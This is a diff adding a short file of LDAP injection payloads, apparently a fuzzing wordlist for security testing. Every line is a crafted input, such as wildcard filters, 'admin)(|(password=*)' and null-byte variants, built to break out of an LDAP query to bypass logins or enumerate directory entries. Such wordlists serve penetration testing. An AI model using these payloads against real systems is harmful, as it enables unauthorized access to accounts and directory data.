@@ -1,0 +1,16 @@
+*
+*)(uid=*))(|(uid=*
+*)(&
+*))%00
+admin)(|(password=*)
+admin)(&)
+x)(|(objectClass=*)
+admin)#
+*)(uid=*
+)(uid=*)(|(uid=*
+*)(objectClass=user)
+*)(objectClass=person)
+*)(objectClass=group)
+*)(mail=*
+admin\x00
+admin%00
